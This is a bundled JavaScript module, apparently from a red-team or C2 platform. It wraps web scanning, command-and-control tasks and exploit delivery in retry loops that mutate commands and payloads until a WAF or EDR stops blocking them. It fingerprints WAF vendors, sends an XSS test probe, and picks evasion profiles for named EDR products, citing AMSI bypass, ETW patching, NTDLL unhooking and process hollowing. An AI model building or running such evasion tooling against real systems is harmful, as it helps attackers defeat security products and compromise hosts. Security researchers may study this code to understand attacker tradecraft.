import {
  evasionC2Task,
  evasionExploit,
  evasionScan,
  storeFinding
} from "./chunk-SP7DWOM3.js";
import {
  buildPipeline
} from "./chunk-W2K2S37P.js";
import {
  generateMutations
} from "./chunk-JGUFAE3I.js";
import "./chunk-KFQGP6VL.js";

// server/lib/evasion-integrations.ts
async function runEvasionAwareScan(request) {
  if (!request.evasionEnabled) {
    return {
      scanStatus: "started_without_evasion",
      bypassAchieved: true,
      originalBlocked: false
    };
  }
  const finding = await evasionScan(
    request.targetUrl,
    `DAST Scan: ${request.scanName || request.targetUrl}`,
    async (url, headers, options) => {
      try {
        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 15e3);
        const response = await fetch(url, {
          method: options.method || "GET",
          headers: {
            ...headers,
            "User-Agent": headers["User-Agent"] || "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
          },
          signal: controller.signal,
          redirect: "follow"
        });
        clearTimeout(timeout);
        const body = await response.text().catch(() => "");
        const respHeaders = {};
        response.headers.forEach((v, k) => {
          respHeaders[k] = v;
        });
        return {
          statusCode: response.status,
          body: body.substring(0, 5e3),
          headers: respHeaders
        };
      } catch (err) {
        throw err;
      }
    },
    {
      maxAttempts: request.maxEvasionAttempts || 10,
      delayBetweenAttempts: 1e3,
      jitterRange: 500,
      abortOnFirstSuccess: true
    }
  );
  storeFinding(finding);
  return {
    scanStatus: finding.finalResult === "bypassed" ? "scan_can_proceed" : "scan_blocked_by_waf",
    evasionFinding: finding,
    wafDetected: finding.defensesDetected,
    bypassAchieved: finding.finalResult === "bypassed",
    bypassTechnique: finding.successfulTechnique?.name,
    originalBlocked: finding.attempts[0]?.result === "blocked"
  };
}
async function runEvasionAwareC2Task(request, executeTaskFn) {
  if (!request.evasionEnabled) {
    const result = await executeTaskFn(request.command, {
      sessionId: request.sessionId,
      taskType: request.taskType,
      transport: request.transport
    });
    return {
      taskId: result.taskId,
      taskStatus: result.status,
      bypassAchieved: result.status !== "blocked",
      originalBlocked: false
    };
  }
  const finding = await evasionC2Task(
    request.sessionTarget,
    request.command,
    async (command, options) => {
      try {
        const result = await executeTaskFn(command, {
          sessionId: request.sessionId,
          taskType: request.taskType,
          transport: options.transport,
          pipelineProfile: options.pipelineProfile
        });
        const blocked = result.status === "blocked" || result.status === "killed" || result.status === "quarantined" || result.error && /blocked|killed|quarantine|denied|amsi/i.test(result.error);
        return {
          success: !blocked,
          body: result.output,
          error: result.error
        };
      } catch (err) {
        return { success: false, error: err.message };
      }
    },
    {
      maxAttempts: request.maxEvasionAttempts || 10,
      delayBetweenAttempts: 2e3,
      jitterRange: 1e3,
      abortOnFirstSuccess: true
    }
  );
  storeFinding(finding);
  const successAttempt = finding.attempts.find((a) => a.result === "bypassed");
  return {
    taskStatus: finding.finalResult === "bypassed" ? "executed" : "blocked_by_edr",
    evasionFinding: finding,
    edrDetected: finding.defensesDetected,
    bypassAchieved: finding.finalResult === "bypassed",
    bypassTechnique: finding.successfulTechnique?.name,
    originalBlocked: finding.attempts[0]?.result === "blocked",
    effectiveCommand: successAttempt?.mutationApplied ? finding.attempts[finding.attempts.length - 1]?.mutationApplied : request.command,
    effectivePipeline: successAttempt?.pipelineProfile,
    effectiveTransport: finding.attempts.find((a) => a.result === "bypassed")?.techniqueId === "protocol_rotation" ? "rotated" : request.transport
  };
}
async function runEvasionAwareExploit(request, exploitFn) {
  if (!request.evasionEnabled) {
    const result = await exploitFn(request.payload, {});
    return {
      exploitStatus: result.success ? "success" : "failed",
      bypassAchieved: result.success,
      originalBlocked: !result.success,
      stagedDelivery: false
    };
  }
  const finding = await evasionExploit(
    request.target,
    request.exploitName,
    request.payload,
    exploitFn,
    {
      maxAttempts: request.maxEvasionAttempts || 12,
      delayBetweenAttempts: 1500,
      jitterRange: 800,
      abortOnFirstSuccess: true
    }
  );
  storeFinding(finding);
  const successAttempt = finding.attempts.find((a) => a.result === "bypassed");
  return {
    exploitStatus: finding.finalResult === "bypassed" ? "exploit_succeeded" : "exploit_blocked",
    evasionFinding: finding,
    defensesDetected: finding.defensesDetected,
    bypassAchieved: finding.finalResult === "bypassed",
    bypassTechnique: finding.successfulTechnique?.name,
    originalBlocked: finding.attempts[0]?.result === "blocked",
    effectivePipeline: successAttempt?.pipelineProfile,
    effectiveObfuscationLevel: successAttempt?.pipelineProfile === "high" ? 3 : successAttempt?.pipelineProfile === "medium" ? 2 : successAttempt?.pipelineProfile === "low" ? 1 : 0,
    stagedDelivery: finding.attempts.some((a) => a.techniqueId === "staged_delivery" && a.result === "bypassed")
  };
}
async function probeDefenses(targetUrl) {
  const securityHeaders = {};
  const wafProducts = [];
  const edrIndicators = [];
  const recommendations = [];
  let accessible = false;
  let responseCode;
  let serverHeader;
  try {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 1e4);
    const response = await fetch(targetUrl, {
      method: "GET",
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
      },
      signal: controller.signal,
      redirect: "follow"
    });
    clearTimeout(timeout);
    responseCode = response.status;
    accessible = response.status >= 200 && response.status < 400;
    serverHeader = response.headers.get("server") || void 0;
    const secHeaders = [
      "x-frame-options",
      "x-content-type-options",
      "x-xss-protection",
      "content-security-policy",
      "strict-transport-security",
      "x-waf-status",
      "x-sucuri-id",
      "x-cdn-provider",
      "cf-ray",
      "x-amz-cf-id",
      "x-akamai-transformed"
    ];
    for (const h of Array.from(secHeaders)) {
      const val = response.headers.get(h);
      if (val) securityHeaders[h] = val;
    }
    if (response.headers.get("cf-ray")) wafProducts.push("Cloudflare");
    if (response.headers.get("x-sucuri-id")) wafProducts.push("Sucuri");
    if (response.headers.get("x-akamai-transformed")) wafProducts.push("Akamai");
    if (response.headers.get("x-amz-cf-id")) wafProducts.push("AWS CloudFront");
    if (serverHeader) {
      if (/cloudflare/i.test(serverHeader)) wafProducts.push("Cloudflare");
      if (/akamai/i.test(serverHeader)) wafProducts.push("Akamai");
      if (/imperva|incapsula/i.test(serverHeader)) wafProducts.push("Imperva");
      if (/bigip|f5/i.test(serverHeader)) wafProducts.push("F5 BIG-IP");
      if (/barracuda/i.test(serverHeader)) wafProducts.push("Barracuda");
    }
    const body = await response.text().catch(() => "");
    if (/captcha|challenge|verify.*human|access.*denied/i.test(body)) {
      wafProducts.push("Challenge Page Detected");
    }
    try {
      const probeUrl = new URL(targetUrl);
      probeUrl.searchParams.set("test", "<script>alert(1)</script>");
      const probeController = new AbortController();
      const probeTimeout = setTimeout(() => probeController.abort(), 1e4);
      const probeResponse = await fetch(probeUrl.toString(), {
        method: "GET",
        headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" },
        signal: probeController.signal,
        redirect: "follow"
      });
      clearTimeout(probeTimeout);
      if (probeResponse.status === 403 || probeResponse.status === 406) {
        wafProducts.push("Active WAF (blocks XSS probes)");
      }
    } catch {
      wafProducts.push("Active WAF (connection blocked on probe)");
    }
  } catch (err) {
    if (/ECONNRESET|ECONNREFUSED/i.test(err.message)) {
      recommendations.push("Target actively refuses connections \u2014 may have IP-based blocking.");
    }
    if (/timeout/i.test(err.message)) {
      recommendations.push("Target timed out \u2014 may have rate limiting or geo-blocking.");
    }
  }
  const uniqueWaf = [...new Set(wafProducts)];
  if (uniqueWaf.length > 0) {
    recommendations.push(`WAF detected: ${uniqueWaf.join(", ")}. Enable evasion orchestrator for scanning and exploits.`);
    recommendations.push("Start with Level 1-2 evasion (UA rotation, header normalization) before escalating.");
  } else {
    recommendations.push("No WAF detected on initial probe. Standard scanning should work without evasion.");
  }
  if (Object.keys(securityHeaders).length < 3) {
    recommendations.push("Target has minimal security headers \u2014 may be vulnerable to header-based attacks.");
  }
  return {
    target: targetUrl,
    accessible,
    wafDetected: uniqueWaf.length > 0,
    wafProducts: uniqueWaf,
    edrIndicators,
    responseCode,
    serverHeader,
    securityHeaders,
    recommendations
  };
}
function selectPipelineForDefenses(defensesDetected, targetOS = "windows") {
  const hasEDR = defensesDetected.some(
    (d) => /crowdstrike|sentinelone|carbon.*black|defender|cylance|sophos|kaspersky|bitdefender|eset/i.test(d)
  );
  const hasWAF = defensesDetected.some(
    (d) => /cloudflare|akamai|imperva|aws.*waf|modsecurity|sucuri|barracuda|f5|fortinet|palo.*alto/i.test(d)
  );
  const hasAMSI = defensesDetected.some((d) => /amsi|antimalware/i.test(d));
  let profile = "none";
  let reasoning = "";
  if (hasEDR && hasAMSI) {
    profile = "high";
    reasoning = `EDR (${defensesDetected.filter((d) => /crowdstrike|sentinelone|carbon|defender|cylance|sophos/i.test(d)).join(", ")}) and AMSI detected \u2014 using full evasion pipeline with NTDLL unhook, ETW patch, AMSI bypass, and process hollowing.`;
  } else if (hasEDR) {
    profile = "medium";
    reasoning = `EDR detected (${defensesDetected.filter((d) => /crowdstrike|sentinelone|carbon|defender|cylance|sophos/i.test(d)).join(", ")}) \u2014 using medium profile with direct syscalls and process injection.`;
  } else if (hasWAF) {
    profile = "low";
    reasoning = `WAF detected (${defensesDetected.filter((d) => /cloudflare|akamai|imperva|aws|modsecurity|sucuri/i.test(d)).join(", ")}) \u2014 using low profile with shellcode conversion and string encryption.`;
  } else {
    profile = "none";
    reasoning = "No significant defenses detected \u2014 raw payload should work.";
  }
  const pipeline = buildPipeline(profile, { targetOS });
  return { profile, pipeline, reasoning };
}
function generateOptimizedMutations(command, defensesDetected) {
  const hasEDR = defensesDetected.some(
    (d) => /crowdstrike|sentinelone|carbon.*black|defender/i.test(d)
  );
  const categories = [];
  let reasoning = "";
  if (hasEDR) {
    categories.push(
      "case_mutation",
      "path_mutation",
      "env_var_substitution",
      "encoding_mutation",
      "argument_mutation",
      "string_concat"
    );
    reasoning = "EDR detected \u2014 applying comprehensive command mutations including case, path, env var, encoding, argument, and string concatenation mutations.";
  } else {
    categories.push("case_mutation", "whitespace_mutation", "separator_mutation");
    reasoning = "Basic defenses \u2014 applying lightweight mutations (case, whitespace, separator).";
  }
  const mutations = generateMutations(command, {
    categories,
    maxPerCategory: 3
  });
  return { mutations, reasoning };
}
export {
  generateOptimizedMutations,
  probeDefenses,
  runEvasionAwareC2Task,
  runEvasionAwareExploit,
  runEvasionAwareScan,
  selectPipelineForDefenses
};
